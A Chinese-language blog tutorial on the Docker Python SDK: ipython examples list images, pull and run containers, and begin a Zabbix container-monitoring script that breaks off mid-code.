class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ yum -y install ipython</span><br><span class="line">$ ipython</span><br><span class="line"></span><br><span class="line">In [1]: import docker</span><br><span class="line"></span><br><span class="line">In [2]: client = docker.APIClient(base_url=<span class="string">'unix://var/run/docker.sock'</span>,version=<span class="string">'auto'</span>,timeout=5)</span><br><span class="line"></span><br><span class="line">In [3]: client.version()</span><br><span class="line">Out[3]: </span><br><span class="line">&#123;u<span class="string">'ApiVersion'</span>: u<span class="string">'1.35'</span>,</span><br><span class="line"> u<span class="string">'Arch'</span>: u<span class="string">'amd64'</span>,</span><br><span class="line"> u<span class="string">'BuildTime'</span>: u<span class="string">'2017-12-27T20:12:46.000000000+00:00'</span>,</span><br><span class="line"> u<span class="string">'Components'</span>: [&#123;u<span class="string">'Details'</span>: &#123;u<span class="string">'ApiVersion'</span>: u<span class="string">'1.35'</span>,</span><br><span class="line">    u<span class="string">'Arch'</span>: u<span class="string">'amd64'</span>,</span><br><span class="line">    u<span class="string">'BuildTime'</span>: u<span class="string">'2017-12-27T20:12:46.000000000+00:00'</span>,</span><br><span class="line">    u<span class="string">'Experimental'</span>: u<span class="string">'false'</span>,</span><br><span class="line">    u<span class="string">'GitCommit'</span>: u<span class="string">'c97c6d6'</span>,</span><br><span class="line">    u<span class="string">'GoVersion'</span>: u<span class="string">'go1.9.2'</span>,</span><br><span class="line">    u<span class="string">'KernelVersion'</span>: u<span class="string">'4.11.1-1.el7.elrepo.x86_64'</span>,</span><br><span class="line">    u<span class="string">'MinAPIVersion'</span>: u<span class="string">'1.12'</span>,</span><br><span class="line">    u<span class="string">'Os'</span>: u<span class="string">'linux'</span>&#125;,</span><br><span class="line">   u<span class="string">'Name'</span>: u<span class="string">'Engine'</span>,</span><br><span class="line">   u<span class="string">'Version'</span>: u<span class="string">'17.12.0-ce'</span>&#125;],</span><br><span class="line"> u<span class="string">'GitCommit'</span>: u<span class="string">'c97c6d6'</span>,</span><br><span class="line"> u<span class="string">'GoVersion'</span>: u<span class="string">'go1.9.2'</span>,</span><br><span class="line"> u<span class="string">'KernelVersion'</span>: u<span class="string">'4.11.1-1.el7.elrepo.x86_64'</span>,</span><br><span class="line"> u<span class="string">'MinAPIVersion'</span>: u<span class="string">'1.12'</span>,</span><br><span class="line"> u<span class="string">'Os'</span>: u<span class="string">'linux'</span>,</span><br><span class="line"> u<span class="string">'Platform'</span>: &#123;u<span class="string">'Name'</span>: u<span class="string">''</span>&#125;,</span><br><span class="line"> u<span class="string">'Version'</span>: u<span class="string">'17.12.0-ce'</span>&#125;</span><br></pre></td></tr></table></figure><p><code>docker.APIClient</code> 中部分相关参数说明</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Args:</span><br><span class="line">   base_url (str): 指定链接路径，可以通过socket或者tcp方式链接``unix:///var/run/docker.sock`` or ``tcp://127.0.0.1:1234``</span><br><span class="line">   version (str): 指定API使用的版本(docker=2.0.0默认的api版本是1.24,最低支持1.21,docker1.9+的api是1.21),因此在使用python的docker模块时一定要注意docker的api以及docker模块的api是否兼容。当然如果设置为 ``auto`` 会去自动检测server的版本</span><br><span class="line">   timeout (int): 使用API调用的默认超时时间，默认单位为秒</span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="用docker-python-api的方式查看镜像"><a href="#用docker-python-api的方式查看镜像" class="headerlink" title="用docker python api的方式查看镜像"></a>用docker python api的方式查看镜像</h4><p>等同于执行<code>docker images</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ ipython</span><br><span class="line"></span><br><span class="line">In [1]: import docker</span><br><span class="line">In [2]: client = docker.APIClient(base_url=<span class="string">'unix://var/run/docker.sock'</span>,version=<span class="string">'auto'</span>,timeout=5)</span><br><span class="line"></span><br><span class="line">In [6]: client.images()</span><br><span class="line">Out[6]: </span><br><span class="line">[&#123;u<span class="string">'Containers'</span>: -1,</span><br><span class="line">  u<span class="string">'Created'</span>: 1496683994,</span><br><span class="line">  u<span class="string">'Id'</span>: u<span class="string">'sha256:3bee3060bfc81c061ce7069df35ce090593bda584d4ef464bc0f38086c11371d'</span>,</span><br><span class="line">  u<span class="string">'Labels'</span>: &#123;u<span class="string">'build-date'</span>: u<span class="string">'20170605'</span>,</span><br><span class="line">   u<span class="string">'license'</span>: u<span class="string">'GPLv2'</span>,</span><br><span class="line">   u<span class="string">'name'</span>: u<span class="string">'CentOS Base Image'</span>,</span><br><span class="line">   u<span class="string">'vendor'</span>: u<span class="string">'CentOS'</span>&#125;,</span><br><span class="line">  u<span class="string">'ParentId'</span>: u<span class="string">''</span>,</span><br><span class="line">  u<span class="string">'RepoDigests'</span>: [u<span class="string">'centos@sha256:9173758d35da834e8320f57093290b3bdcefe7fc9f4855a1ed4012b7bd940273'</span>],</span><br><span class="line">  u<span class="string">'RepoTags'</span>: [u<span class="string">'centos:7'</span>],</span><br><span class="line">  u<span class="string">'SharedSize'</span>: -1,</span><br><span class="line">  u<span class="string">'Size'</span>: 192555856,</span><br><span class="line">  u<span class="string">'VirtualSize'</span>: 192555856&#125;,</span><br><span class="line"> &#123;u<span class="string">'Containers'</span>: -1,</span><br><span class="line">  u<span class="string">'Created'</span>: 1484706726,</span><br><span class="line">  u<span class="string">'Id'</span>: u<span class="string">'sha256:36b1e23becabc0b27c5787712dce019982c048665fd9e7e6cb032a46bcac510d'</span>,</span><br><span class="line">  u<span class="string">'Labels'</span>: &#123;&#125;,</span><br><span class="line">  u<span class="string">'ParentId'</span>: u<span class="string">''</span>,</span><br><span class="line">  u<span class="string">'RepoDigests'</span>: [u<span class="string">'swarm@sha256:815fc8fd4617d866e1256999c2c0a55cc8f377f3dade26c3edde3f0543a70c04'</span>],</span><br><span class="line">  u<span class="string">'RepoTags'</span>: [u<span class="string">'swarm:1.2.6'</span>],</span><br><span class="line">  u<span class="string">'SharedSize'</span>: -1,</span><br><span class="line">  u<span class="string">'Size'</span>: 15852351,</span><br><span class="line">  u<span class="string">'VirtualSize'</span>: 15852351&#125;]</span><br></pre></td></tr></table></figure><h4 id="用docker-python-api的方式pull拉取一个镜像"><a href="#用docker-python-api的方式pull拉取一个镜像" class="headerlink" title="用docker python api的方式pull拉取一个镜像"></a>用docker python api的方式pull拉取一个镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ipython</span><br><span class="line">In [1]: import docker</span><br><span class="line"></span><br><span class="line">In [2]: client = docker.APIClient(base_url=<span class="string">'unix://var/run/docker.sock'</span>,version=<span class="string">'auto'</span>,timeout=5)</span><br><span class="line"></span><br><span class="line">In [7]: client.pull(<span class="string">'centos:7'</span>)</span><br></pre></td></tr></table></figure><h4 id="通过docker-python-api的方式运行一个容器"><a href="#通过docker-python-api的方式运行一个容器" class="headerlink" title="通过docker python api的方式运行一个容器"></a>通过docker python api的方式运行一个容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ipython</span><br><span class="line">In [1]: import docker</span><br><span class="line"></span><br><span class="line">In [2]: client = docker.APIClient(base_url=<span class="string">'unix://var/run/docker.sock'</span>,version=<span class="string">'auto'</span>,timeout=5)</span><br><span class="line"></span><br><span class="line">In [8]: client = docker.from_env()</span><br><span class="line">In [9]: client.containers.run(image=<span class="string">"centos:7"</span>,stdin_open=True,tty=True,<span class="built_in">command</span>=<span class="string">"/bin/bash"</span>,name=<span class="string">"test_docker_python-api"</span>,detach=True)</span><br><span class="line">Out[9]: &lt;Container: e2cd190605&gt;</span><br><span class="line"></span><br><span class="line">In [10]: client.containers.list() <span class="comment"># 列出主机上当前运行的容器</span></span><br><span class="line">Out[10]: [&lt;Container: e2cd190605&gt;, &lt;Container: 5ef3e3e500&gt;]</span><br></pre></td></tr></table></figure><p>在终端执行<code>docker ps -a</code>命令我们会看到刚刚新建的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">e2cd19060581        centos:7               <span class="string">"/bin/bash"</span>              3 seconds ago      Up 2 seconds                            test_docker_python-api</span><br></pre></td></tr></table></figure><h4 id="通过docker-python-api的方式对一个容docker器执行一些操作"><a href="#通过docker-python-api的方式对一个容docker器执行一些操作" class="headerlink" title="通过docker python api的方式对一个容docker器执行一些操作"></a>通过docker python api的方式对一个容docker器执行一些操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ipython</span><br><span class="line">In [1]: import docker</span><br><span class="line"></span><br><span class="line">In [2]: client = docker.APIClient(base_url=<span class="string">'unix://var/run/docker.sock'</span>,version=<span class="string">'auto'</span>,timeout=5)</span><br><span class="line">In [8]: client = docker.from_env()</span><br><span class="line">In [11]: container = client.containers.get(<span class="string">'e2cd190605'</span>) </span><br><span class="line">In [12]: container.logs() <span class="comment">#查看容器输出到控制台的相关日志</span></span><br><span class="line">In [13]: container.stop() <span class="comment">#停止容器ID为e2cd190605的容器</span></span><br><span class="line">In [14]: container.remove() <span class="comment">#删除这个容器</span></span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p><strong>关于docker python api的更多详细用法，可参看学习下官方文档</strong>：</p><ul><li><a href="https://github.com/docker/docker-py" target="_blank" rel="noopener">https://github.com/docker/docker-py</a></li><li><a href="http://docker-py.readthedocs.io/en/stable/index.html" target="_blank" rel="noopener">http://docker-py.readthedocs.io/en/stable/index.html</a></li><li><a href="https://docs.docker.com/develop/sdk/" target="_blank" rel="noopener">https://docs.docker.com/develop/sdk/</a></li></ul><h2 id="用python编写一个Docker容器监控脚本"><a href="#用python编写一个Docker容器监控脚本" class="headerlink" title="用python编写一个Docker容器监控脚本"></a>用python编写一个Docker容器监控脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># -* - coding: UTF-8 -* -</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">The output  configuration file contents.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage: zabbix_module_docker.py [docker.version] [docker.discovery] [docker.up] [docker.mem] [docker.cpu] [docker.stats] [docker.run]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Description</span></span><br><span class="line"><span class="string">            docker.version    The version of docker dameon.</span></span><br><span class="line"><span class="string">            docker.discovery  List containers. Similar to the `docker ps -a` command.</span></span><br><span class="line"><span class="string">            docker.up         The status of one per container.</span></span><br><span class="line"><span class="string">            docker.mem        The memory usage of one per container.</span></span><br><span class="line"><span class="string">            docker.cpu        The cpu usage of one per container.</span></span><br><span class="line"><span class="string">            docker.stats      The network stats of one per container.</span></span><br><span class="line"><span class="string">            docker.exec       Execute command in docker container.</span></span><br><span class="line"><span class="string">for example:</span></span><br><span class="line"><span class="string">    zabbix_module_docker.py docker.version</span></span><br><span class="line"><span class="string">    zabbix_module_docker.py docker.up test_container</span></span><br><span class="line"><span class="string">    zabbix_module_docker.py docker.cpu test_container system</span></span><br><span class="line"><span class="string">    zabbix_module_docker.py docker.stats test_container tx_packets</span></span><br><span class="line"><span class="string">    zabbix_module_docker.py docker.exec test_container fileopen</span></span><br><span class="line"><span class="string">    zabbix_module_docker.py docker.run  centos:7 /bin/bash test_container</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DockerService</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.url = <span class="string">'unix://var/run/docker.sock'</span></span><br><span class="line">        self.docker_running = <span class="keyword">False</span></span><br><span class="line">        self.client = docker.APIClient(base_url=self.url, timeout=<span class="number">3</span>, num_pools=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_version</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.client.version()[<span class="string">'Version'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_discovery</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            containerList = self.client.containers(all=<span class="keyword">True</span>)</span><br><span class="line">            self.docker_running = <span class="keyword">True</span></span><br><span class="line">        <span class="comment"># Apologies for the broad exception, it just works here.</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            self.docker_running = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> self.docker_running:</span><br><span class="line">            <span class="comment"># print 'status ok succeeded in obtaining docker container list</span></span><br><span class="line">            <span class="comment"># return containerList</span></span><br><span class="line">            <span class="keyword">if</span> len(containerList) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"&#123;"</span>)</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"\t\"data\":["</span>)</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"\t]"</span>)</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"&#125;"</span>)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"&#123;"</span>)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"\t\"data\":[\n"</span>)</span><br><span class="line">            <span class="keyword">for</span> container <span class="keyword">in</span> containerList[<span class="number">0</span>:len(containerList)<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"\t&#123;"</span>)</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"\t\t\"&#123;#CONTAINERNAME&#125;\":\""</span>+str(container[<span class="string">'Names'</span>][<span class="number">0</span>]).split(<span class="string">"/"</span>)[<span class="number">1</span>]+<span class="string">"\""</span>+<span class="string">","</span>)</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"\t\t\"&#123;#CONTAINERID&#125;\":\""</span>+str(container[<span class="string">'Id'</span>])+<span class="string">"\""</span>)</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"\t&#125;,"</span>)</span><br><span class="line">true        <span class="keyword">print</span> (<span class="string">"\t&#123;"</span>)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"\t\t\"&#123;#CONTAINERNAME&#125;\":\""</span>+str(containerList[<span class="number">-1</span>][<span class="string">'Names'</span>][<span class="number">0</span>]).split(<span class="string">"/"</span>)[<span class="number">1</span>]+<span class="string">"\""</span>+<span class="string">","</span>)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"\t\t\"&#123;#CONTAINERID&#125;\":\""</span>+str(containerList[<span class="number">-1</span>][<span class="string">'Id'</span>])+<span class="string">"\""</span>)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"\t&#125;"</span>)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"\n\t]"</span>)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"&#125;"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_up</span><span class="params">(self, containerName)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            containerList = self.client.containers(all=<span class="keyword">True</span>)</span><br><span class="line">            self.docker_running = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            self.docker_running = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> self.docker_running:</span><br><span class="line">            <span class="keyword">for</span> container <span class="keyword">in</span> containerList:</span><br><span class="line">                <span class="keyword">if</span> containerName == str(container[<span class="string">'Names'</span>][<span class="number">0</span>]).split(<span class="string">"/"</span>)[<span class="number">1</span>]:</span><br><span class="line">                    <span class="keyword">if</span> container[<span class="string">'State'</span>] == <span class="string">"running"</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_stats</span><span class="params">(self, container)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            stats = self.client.stats(container, <span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            self.docker_running = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> self.docker_up(container) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> stat <span class="keyword">in</span> stats:</span><br><span class="line">                s = json.loads(json.dumps(stat))</span><br><span class="line">                <span class="keyword">return</span> s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'0'</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_inspect</span><span class="params">(self, container)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            inspect = self.client.inspect_container(container)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            self.docker_running = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> self.docker_up(container) == <span class="number">1</span>:</span><br><span class="line">            s = json.loads(json.dumps(inspect))</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'status err failed to obtain docker container inspect.'</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_cpu</span><span class="params">(self, container)</span>:</span></span><br><span class="line">        stats = self.docker_stats(container)</span><br><span class="line">        inspect = self.docker_inspect(container)</span><br><span class="line">        percpu_usage=stats[<span class="string">'cpu_stats'</span>][<span class="string">'cpu_usage'</span>][<span class="string">'percpu_usage'</span>]</span><br><span class="line">        <span class="keyword">while</span> <span class="number">0</span> <span class="keyword">in</span> percpu_usage:</span><br><span class="line">true    percpu_usage.remove(<span class="number">0</span>)</span><br><span class="line">        cpu_num=float(len(percpu_usage))</span><br><span class="line">        total_cpu1 = stats[<span class="string">'cpu_stats'</span>][<span class="string">'cpu_usage'</span>][<span class="string">'total_usage'</span>]</span><br><span class="line">        docker_system_usage1 = stats[<span class="string">'cpu_stats'</span>][<span class="string">'system_cpu_usage'</span>]</span><br><span class="line">        stats = self.docker_stats(container)</span><br><span class="line">        total_cpu2 = stats[<span class="string">'cpu_stats'</span>][<span class="string">'cpu_usage'</span>][<span class="string">'total_usage'</span>]</span><br><span class="line">        docker_system_usage2 = stats[<span class="string">'cpu_stats'</span>][<span class="string">'system_cpu_usage'</span>]</span><br><span class="line">        cpuDelta = float(total_cpu2) - float(total_cpu1)</span><br><span class="line">        systemDelta = float(docker_system_usage2) - float(docker_system_usage1)</span><br><span class="line">        daoke_cpu_num = str(str(self.client.inspect_container(str(container)))).split(<span class="string">'DAOKECPU='</span>)[<span class="number">-1</span>].split(<span class="string">"\'"</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> cpuDelta &gt;= <span class="number">0</span> <span class="keyword">and</span> systemDelta &gt;= <span class="number">0</span>:</span><br><span class="line">           <span class="keyword">if</span> daoke_cpu_num == <span class="string">"&#123;u"</span>:</span><br><span class="line">              daoke_cpu_num = <span class="number">24</span></span><br><span class="line">              <span class="keyword">return</span> round((float(cpuDelta)/float(systemDelta) * cpu_num * <span class="number">100.0</span>)/float(daoke_cpu_num), <span class="number">2</span>)</span><br><span class="line">           <span class="keyword">elif</span> daoke_cpu_num == <span class="string">"0"</span>:</span><br><span class="line">              daoke_cpu_num = <span class="number">24</span></span><br><span class="line">              <span class="keyword">return</span> round((float(cpuDelta)/float(systemDelta) * cpu_num * <span class="number">100.0</span>)/float(daoke_cpu_num), <span class="number">2</span>)</span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">              <span class="keyword">return</span> round((float(cpuDelta)/float(systemDelta) * cpu_num * <span class="number">100.0</span>)/float(daoke_cpu_num), <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_mem</span><span class="params">(self, container, item)</span>:</span></span><br><span class="line">        stats = self.docker_stats(container)</span><br><span class="line">        <span class="keyword">if</span> item == <span class="string">"total_cache"</span>:</span><br><span class="line">            <span class="keyword">return</span> stats[<span class="string">'memory_stats'</span>][<span class="string">'stats'</span>][<span class="string">'total_cache'</span>]</span><br><span class="line">        <span class="keyword">elif</span> item == <span class="string">"hierarchical_memory_limit"</span>:</span><br><span class="line">            <span class="keyword">return</span> stats[<span class="string">'memory_stats'</span>][<span class="string">'stats'</span>][<span class="string">'hierarchical_memory_limit'</span>]</span><br><span class="line">        <span class="keyword">elif</span> item == <span class="string">"hierarchical_memsw_limit"</span>:</span><br><span class="line">            <span class="keyword">return</span> stats[<span class="string">'memory_stats'</span>][<span class="string">'stats'</span>][<span class="string">'hierarchical_memsw_limit'</span>]</span><br><span class="line">        <span class="keyword">elif</span> item == <span class="string">"total_rss"</span>:</span><br><span class="line">            <span class="keyword">return</span> stats[<span class="string">'memory_stats'</span>][<span class="string">'stats'</span>][<span class="string">'total_rss'</span>]</span><br><span class="line">        <span class="keyword">elif</span> item == <span class="string">"total_swap"</span>:</span><br><span class="line">            <span class="keyword">return</span> stats[<span class="string">'memory_stats'</span>][<span class="string">'stats'</span>][<span class="string">'total_swap'</span>]</span><br><span class="line">        <span class="keyword">elif</span> 